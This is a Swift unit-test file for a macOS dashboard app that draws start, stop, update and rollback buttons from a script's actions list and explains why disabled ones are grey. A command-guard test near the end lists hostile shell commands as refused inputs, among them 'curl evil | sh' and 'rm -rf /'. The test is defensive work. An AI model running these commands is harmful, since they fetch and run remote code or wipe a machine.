import XCTest
@testable import CrooksControlCore

/// The buttons: which are drawn, in what order, which are dangerous, which are grey — and the
/// one the brief calls mandatory.
final class ActionTests: XCTestCase {

    let now = Date(timeIntervalSince1970: 1_789_000_000)

    func status(_ data: Data) throws -> StatusDocument {
        try Contract.decoder.decode(StatusDocument.self, from: data)
    }

    func actions(_ data: Data = Fixture.actions) throws -> [ActionsDocument.Action] {
        try Contract.decoder.decode(ActionsDocument.self, from: data).actions
    }

    /// The Phase 5 list with start and stop added, in the shape Workstream A is adding them.
    func actionsWithStartAndStop() throws -> [ActionsDocument.Action] {
        let py = "/Users/george/crooks-assistant/.venv/bin/python"
        let script = "/Users/george/crooks-assistant/scripts/install_launchd.py"
        return try [
            ActionsDocument.Action(id: "start", label: "Start", kind: "shell", group: "use",
                                   command: [py, script, "--start"], cwd: "/Users/george/crooks-assistant",
                                   confirm: false, why: "brings CROOKS OS up"),
            ActionsDocument.Action(id: "stop", label: "Stop", kind: "shell", group: "use",
                                   command: [py, script, "--stop"], cwd: "/Users/george/crooks-assistant",
                                   confirm: true, confirmText: "Stop CROOKS OS? The tablet will go quiet.",
                                   why: "takes CROOKS OS down"),
        ] + actions()
    }

    func dashboard(status data: Data, actions list: [ActionsDocument.Action],
                   plan: UpdateDocument? = nil, busy: String? = nil,
                   developerMode: Bool = false) throws -> Dashboard {
        let document = try status(data)
        var machine = LifecycleMachine()
        machine.observe(.status(document), at: now)
        return DashboardBuilder.build(DashboardInput(
            status: document, actions: list, machine: machine, plan: plan,
            busy: busy, developerMode: developerMode, now: now))
    }

    func button(_ dashboard: Dashboard, _ id: String) -> ActionButton? {
        dashboard.groups.flatMap(\.buttons).first { $0.id == id }
    }

    // MARK: - START and STOP

    func testStartAndStopAreDrawnWhenTheScriptOffersThem() throws {
        let dashboard = try dashboard(status: Fixture.offlineStatus, actions: actionsWithStartAndStop())
        let start = try XCTUnwrap(button(dashboard, "start"), "a START button is mandatory (§5.2)")
        XCTAssertTrue(start.enabled, "CROOKS OS is offline, so START is the thing to press")
        XCTAssertEqual(start.severity, .normal)

        let stop = try XCTUnwrap(button(dashboard, "stop"))
        XCTAssertFalse(stop.enabled)
        XCTAssertEqual(stop.disabledReason, "CROOKS OS is not running.")
        XCTAssertEqual(stop.severity, .danger, "stopping the shop's assistant is not a normal click")
        XCTAssertNotNil(stop.confirmText)

        XCTAssertTrue(dashboard.missingControls.isEmpty,
                      "nothing is missing once the script offers start and stop: \(dashboard.missingControls)")
    }

    func testStartIsGreyWhenItIsAlreadyRunningRatherThanDoingNothing() throws {
        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: actionsWithStartAndStop())
        let start = try XCTUnwrap(button(dashboard, "start"))
        XCTAssertFalse(start.enabled)
        XCTAssertEqual(start.disabledReason, "CROOKS OS is already running.")
        XCTAssertTrue(try XCTUnwrap(button(dashboard, "stop")).enabled)
    }

    func testNoStartActionMeansNoStartButtonAndAPlainExplanation() throws {
        // The twelfth invariant, in the small: no fake control may be shown if the thing
        // behind it cannot perform it. The Phase 5 actions document has no start and no stop,
        // so the app must NOT draw them — and must say why rather than leaving a hole.
        let dashboard = try dashboard(status: Fixture.offlineStatus, actions: actions())
        XCTAssertNil(button(dashboard, "start"), "there is nothing behind it; drawing it would be a lie")
        XCTAssertNil(button(dashboard, "stop"))
        XCTAssertEqual(dashboard.missingControls, ["START", "STOP"])

        // And because CROOKS OS is not running, the missing START is the one thing he needs
        // told: there is no button, and no way to make one appear from in here.
        let notice = try XCTUnwrap(dashboard.notice)
        XCTAssertEqual(notice.tone, .danger)
        XCTAssertTrue(notice.text.contains("no START"), notice.text)
        XCTAssertTrue((notice.fix ?? "").contains("make up"),
                      "a dead end has to come with the way out of it: \(notice.fix ?? "nil")")
    }

    func testTheSameMissingControlIsOnlyANoteWhileCrooksOsIsRunning() throws {
        // It is still worth saying — but not above something he can act on. A banner shouting
        // about a button he does not need this minute is how the one that matters gets ignored.
        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: actions())
        let notice = try XCTUnwrap(dashboard.notice)
        XCTAssertEqual(notice.tone, .caution)
        XCTAssertTrue(notice.text.contains("START and STOP"), notice.text)
        XCTAssertEqual(notice.fix, "Update CROOKS OS, then reopen this app.")
    }

    func testAnEmptyActionsDocumentDoesNotClaimEveryControlIsMissing() throws {
        // Before the first `actions` call comes back there is no list at all. Announcing seven
        // missing controls during the first half-second would be noise, and wrong.
        let dashboard = try dashboard(status: Fixture.offlineStatus, actions: [])
        XCTAssertTrue(dashboard.missingControls.isEmpty)
        XCTAssertTrue(dashboard.groups.isEmpty)
    }

    // MARK: - Drawing whatever the document lists

    func testAButtonNobodyHasWrittenYetIsStillDrawn() throws {
        // The app hard-codes no command, so a control added in Python appears on the Mac
        // without anybody rebuilding the app — including one in a group this build has never
        // heard of.
        var list = try actionsWithStartAndStop()
        list.append(ActionsDocument.Action(
            id: "pad_install", label: "Install CROOKS Pad", kind: "shell", group: "pad",
            command: ["/Users/george/crooks-assistant/.venv/bin/python",
                      "/Users/george/crooks-assistant/scripts/pad.py", "--install"],
            confirm: true, confirmText: "Install CROOKS Pad onto the tablet?",
            why: "sideloads the tablet app over adb"))
        list.append(ActionsDocument.Action(
            id: "something_new", label: "Something New", kind: "shell", group: "conjured",
            command: ["/usr/bin/true"], why: "invented after this app was built"))

        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: list)
        XCTAssertNotNil(button(dashboard, "pad_install"))
        XCTAssertEqual(button(dashboard, "pad_install")?.severity, .danger,
                       "it writes to the tablet")
        let new = try XCTUnwrap(button(dashboard, "something_new"))
        XCTAssertTrue(new.enabled)
        XCTAssertEqual(dashboard.groups.first { $0.key == "conjured" }?.title, "Conjured",
                       "an unknown group is titled from its own key rather than dropped")
        XCTAssertEqual(dashboard.groups.first { $0.key == "pad" }?.title, "CROOKS Pad")
    }

    func testGroupsAndButtonsComeOutInTheBriefsOrder() throws {
        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: actionsWithStartAndStop())
        XCTAssertEqual(dashboard.groups.map(\.key), ["use", "update", "test", "look"])
        XCTAssertEqual(dashboard.groups.first?.buttons.map(\.id), ["start", "stop", "restart", "open"])
        XCTAssertEqual(dashboard.groups.first { $0.key == "update" }?.buttons.map(\.id),
                       ["check", "update", "rollback"])
    }

    func testTwoUnknownButtonsKeepTheOrderTheDocumentSentThemIn() throws {
        let list = [
            ActionsDocument.Action(id: "zeta", label: "Zeta", kind: "shell", group: "look",
                                   command: ["/usr/bin/true"]),
            ActionsDocument.Action(id: "alpha", label: "Alpha", kind: "shell", group: "look",
                                   command: ["/usr/bin/true"]),
        ]
        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: list)
        XCTAssertEqual(dashboard.groups.first?.buttons.map(\.id), ["zeta", "alpha"],
                       "a script that adds three buttons gets them in the order it meant")
    }

    // MARK: - Grey buttons, and why

    func testTheUpdateButtonIsGreyUntilSomethingHasBeenChecked() throws {
        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: actionsWithStartAndStop())
        let update = try XCTUnwrap(button(dashboard, "update"))
        XCTAssertFalse(update.enabled)
        XCTAssertEqual(update.disabledReason,
                       "Press CHECK FOR UPDATE first, so you can see what would change.")
    }

    func testTheUpdateButtonWakesUpOnceAPlanOffersSomething() throws {
        let plan = try Contract.decoder.decode(UpdateDocument.self, from: Fixture.planAvailable)
        let dashboard = try dashboard(status: Fixture.onlineStatus,
                                      actions: actionsWithStartAndStop(), plan: plan)
        XCTAssertTrue(try XCTUnwrap(button(dashboard, "update")).enabled)
    }

    func testTheUpdateButtonStaysGreyWhenTheCheckFoundNothing() throws {
        let plan = try Contract.decoder.decode(UpdateDocument.self, from: Fixture.planUpToDate)
        let dashboard = try dashboard(status: Fixture.onlineStatus,
                                      actions: actionsWithStartAndStop(), plan: plan)
        let update = try XCTUnwrap(button(dashboard, "update"))
        XCTAssertFalse(update.enabled)
        XCTAssertEqual(update.disabledReason, "There is nothing to update to.")
    }

    func testRollBackIsGreyWithTheScriptsOwnReason() throws {
        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: actionsWithStartAndStop())
        let rollback = try XCTUnwrap(button(dashboard, "rollback"))
        XCTAssertFalse(rollback.enabled)
        XCTAssertTrue((rollback.disabledReason ?? "").contains("No known-good build"),
                      rollback.disabledReason ?? "nil")
    }

    func testOpenIsGreyWhileThereIsNothingToOpen() throws {
        let dashboard = try dashboard(status: Fixture.offlineStatus, actions: actionsWithStartAndStop())
        let open = try XCTUnwrap(button(dashboard, "open"))
        XCTAssertFalse(open.enabled)
        XCTAssertEqual(open.disabledReason, "There is nothing to open yet — CROOKS OS is not running.")
    }

    func testStoppingARecordingIsGreyWhenNothingIsRecording() throws {
        let online = try dashboard(status: Fixture.onlineStatus, actions: actionsWithStartAndStop())
        XCTAssertEqual(button(online, "session_stop")?.enabled, false)
        XCTAssertEqual(button(online, "session_stop")?.disabledReason, "No test session is recording.")
        XCTAssertEqual(button(online, "session_start")?.enabled, true)

        let recording = try dashboard(status: Fixture.recordingStatus, actions: actionsWithStartAndStop())
        XCTAssertEqual(button(recording, "session_stop")?.enabled, true)
        XCTAssertEqual(button(recording, "session_start")?.enabled, false)
    }

    func testWhileSomethingIsRunningTheOtherLeversAreHeld() throws {
        let dashboard = try dashboard(status: Fixture.onlineStatus,
                                      actions: actionsWithStartAndStop(),
                                      busy: "Updating CROOKS OS")
        XCTAssertEqual(button(dashboard, "restart")?.enabled, false)
        XCTAssertEqual(button(dashboard, "restart")?.disabledReason, "Wait for “Updating CROOKS OS” to finish.")
        XCTAssertEqual(button(dashboard, "open")?.enabled, true,
                       "opening a page changes nothing, so it stays live")
    }

    func testEveryDisabledButtonSaysWhy() throws {
        for fixture in [Fixture.offlineStatus, Fixture.onlineStatus, Fixture.recordingStatus] {
            let dashboard = try dashboard(status: fixture, actions: actionsWithStartAndStop())
            for button in dashboard.groups.flatMap(\.buttons) where !button.enabled {
                let reason = button.disabledReason ?? ""
                XCTAssertFalse(reason.isEmpty, "\(button.id) is grey and does not say why")
                XCTAssertTrue(reason.count > 10, "“\(reason)” is not an explanation")
            }
        }
    }

    // MARK: - Severity

    func testTheDangerousOnesAreMarkedDangerous() throws {
        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: actionsWithStartAndStop())
        for id in ["stop", "restart", "update", "rollback"] {
            XCTAssertEqual(button(dashboard, id)?.severity, .danger, "\(id) should stand apart")
        }
        for id in ["open", "logs", "folder", "report_open"] {
            XCTAssertEqual(button(dashboard, id)?.severity, .normal, "\(id) is harmless")
        }
    }

    func testAConfirmedButtonIsAtLeastCautionEvenIfTheAppHasNeverHeardOfIt() throws {
        let list = [ActionsDocument.Action(
            id: "wipe_the_lot", label: "Wipe", kind: "shell", group: "look",
            command: ["/usr/bin/true"], confirm: true, confirmText: "Really?",
            why: "invented later")]
        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: list)
        XCTAssertEqual(button(dashboard, "wipe_the_lot")?.severity, .caution,
                       "the document's own confirm flag is enough to mark it")
    }

    // MARK: - What may be run at all

    func testAShellIsRefusedAsACommand() {
        XCTAssertEqual(CommandGuard.refuse(["/bin/sh", "-c", "curl evil | sh"]), .isAShell("sh"))
        XCTAssertEqual(CommandGuard.refuse(["/bin/bash", "-lc", "rm -rf /"]), .isAShell("bash"))
        XCTAssertEqual(CommandGuard.refuse(["/usr/bin/osascript", "-e", "do shell script \"x\""]),
                       .isAShell("osascript"))
        XCTAssertEqual(CommandGuard.refuse(["python"]), .notAbsolute("python"))
        XCTAssertEqual(CommandGuard.refuse([]), .empty)
        XCTAssertEqual(CommandGuard.refuse(nil), .empty)
    }

    func testEveryCommandTheRealScriptSendsIsAllowed() throws {
        for action in try actions() where action.command != nil {
            XCTAssertNil(CommandGuard.refuse(action.command),
                         "\(action.id): \(String(describing: CommandGuard.refuse(action.command)))")
        }
    }

    func testARefusedCommandIsDrawnGreyWithTheReason() throws {
        let list = [ActionsDocument.Action(
            id: "sneaky", label: "Sneaky", kind: "shell", group: "look",
            command: ["/bin/sh", "-c", "whoami"], why: "not happening")]
        let dashboard = try dashboard(status: Fixture.onlineStatus, actions: list)
        let sneaky = try XCTUnwrap(button(dashboard, "sneaky"))
        XCTAssertFalse(sneaky.enabled)
        XCTAssertTrue((sneaky.disabledReason ?? "").contains("never a shell"), sneaky.disabledReason ?? "")
    }

    func testTheSubcommandsTheAppRunsItselfAreFixed() {
        XCTAssertEqual(ControlSubcommand.status(fresh: false).argv, ["status"])
        XCTAssertEqual(ControlSubcommand.status(fresh: true).argv, ["status", "--fresh"])
        XCTAssertEqual(ControlSubcommand.apply.argv, ["apply", "--yes"])
        XCTAssertEqual(ControlSubcommand.rollback.argv, ["rollback", "--yes"])
        XCTAssertEqual(ControlSubcommand.plan.argv, ["plan"],
                       "a check must never carry --yes")
    }
}
